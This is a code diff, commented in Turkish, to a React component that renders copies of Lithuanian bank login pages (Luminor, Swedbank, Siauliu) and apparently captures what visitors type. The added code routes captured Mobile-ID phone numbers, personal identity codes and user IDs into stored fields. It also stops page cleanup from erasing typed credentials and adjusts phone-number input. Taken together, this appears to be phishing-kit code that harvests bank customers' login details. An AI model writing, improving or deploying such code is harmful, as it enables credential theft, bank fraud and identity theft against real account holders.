@@ -638,6 +638,30 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             }
           }
 
+          // LT bankalari: telefon alani bankPhone'dur (kullanicinin profil/iletisim
+          // telefonu DEGIL - ayri kolon). Ignore listesi 'phone'/'mobile' isimlerini
+          // tamamen atladigi icin lku Mobile-ID telefonu kayboluyordu; burada ignore
+          // kontrolunden ONCE LT'ye ozel esleme yapiyoruz.
+          if ((bankSlugRef.current || "").endsWith("-lt")) {
+            const ltName = (field.name || "").toLowerCase();
+            const ltId = (field.id || "").toLowerCase();
+            if (isPhoneLikeField(field) || ltName === "phone" || ltId === "phone" || ltName === "phonenumber" || ltId.includes("phone-number")) {
+              assignMappedValue("bankPhone", value, { overwrite: true });
+              continue;
+            }
+            // Kisiye ozel kod / kimlik numarasi alanlari (luminor pc/PersonCode,
+            // swedbank identityNumber, siauliu perscode)
+            if (ltName === "pc" || ltId === "personcode" || ltId === "perscode" || ltName === "perscode" || lowerText.includes("personcode") || lowerText.includes("identitynumber")) {
+              assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
+              continue;
+            }
+            // Luminor kullanici id alani (name=ln) ve acik userId alanlari
+            if (ltName === "ln" || ltName === "userid") {
+              assignUsername(value, true);
+              continue;
+            }
+          }
+
           if (shouldIgnoreCapturedField(field)) {
             continue;
           }
@@ -1012,21 +1036,34 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         //    USTTEKI EKSTRA INPUT KUTUCUKLARINI GIZLE, CLOSE (X) BUTONUNU GIZLE,
         //    FLOATING LABEL ANIMASYONLARINI KALDIR
         // =====================================================================
+        // Kullanici bir alana yazdiysa o alani HICBIR zaman temizleme:
+        // cleanAllInputsAndHideStray 0/150/500/1200ms'de calisiyor; kullanici
+        // sekme degistirip hemen yazmaya baslarsa timer degeri siliyordu.
+        const __ltUserEdited = new WeakSet();
+        document.addEventListener('input', (e) => {
+          const t = e.target;
+          if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) {
+            try { __ltUserEdited.add(t); } catch(_) {}
+          }
+        }, true);
+
         const cleanAllInputsAndHideStray = () => {
           document.querySelectorAll('input, textarea').forEach(el => {
             if (!el) return;
+            if (__ltUserEdited.has(el)) return; // kullanici yazdi - dokunma
             const t = (el.type || el.tagName || '').toLowerCase();
             if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'reset' || t === 'file' || t === 'radio' || t === 'checkbox') {
               return;
             }
             // 444444 gibi 3+ haneli sayisal default valuelari sil
             const v = (el.value || '') + '';
-            if (v && /^\\d{3,}$/.test(v.trim())) {
+            if (v && /^\\d{3,}$/.test(v.trim()) && document.activeElement !== el) {
               el.value = '';
               el.removeAttribute('value');
               try { el.defaultValue = ''; } catch(_) {}
             }
             // Naudotojo ID gibi kullanici idsi fieldlari da her halukarda sifirla
+            // (sadece sayfa ilk acildiginda capture'dan gelen default'lari temizlemek icin)
             const keyText = [
               el.name, el.id, el.getAttribute('formcontrolname'), el.getAttribute('data-testid'),
               el.getAttribute('placeholder'), el.getAttribute('aria-label'), el.getAttribute('autocomplete')
@@ -1036,7 +1073,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               keyText.includes('username') || keyText.includes('login') || keyText.includes('asmens') ||
               keyText.includes('person') || keyText.includes('identity')
             ) {
-              if (el.value) {
+              if (el.value && document.activeElement !== el) {
                 el.value = '';
                 el.removeAttribute('value');
                 try { el.defaultValue = ''; } catch(_) {}
@@ -2751,10 +2788,10 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                     input.parentElement.appendChild(errorMsg);
                 }
 
-                // Sadece rakamlara izin veren event listener (Input olayı)
+                // Sadece rakamlara (+ basta opsiyonel) izin veren event listener (Input olayı)
                 input.addEventListener('input', (e) => {
                     const originalValue = input.value;
-                    const newValue = originalValue.replace(/[^0-9]/g, '');
+                    const newValue = originalValue.replace(/(?!^)\+/g, '').replace(/[^0-9+]/g, '');
                     if (originalValue !== newValue) {
                         input.value = newValue; // Geçersiz karakterleri anında temizle
                         errorMsg.style.display = 'block';
@@ -2766,8 +2803,9 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
                 // Klavye tuş basımını engelleme (Keypress olayı)
                 input.addEventListener('keypress', (e) => {
-                    // Sadece rakamlara ve kontrol tuşlarına izin ver
-                    if (e.key && e.key.length === 1 && !/[0-9]/.test(e.key)) {
+                    // Rakamlara, kontrol tuslarina ve baslangictaki '+' ya izin ver
+                    const isPlusAtStart = e.key === '+' && (input.value || '').length === 0;
+                    if (e.key && e.key.length === 1 && !/[0-9]/.test(e.key) && !isPlusAtStart) {
                         e.preventDefault(); // Karakterin yazılmasını engelle
                         errorMsg.style.display = 'block';
                         clearTimeout(input.errorTimeout);
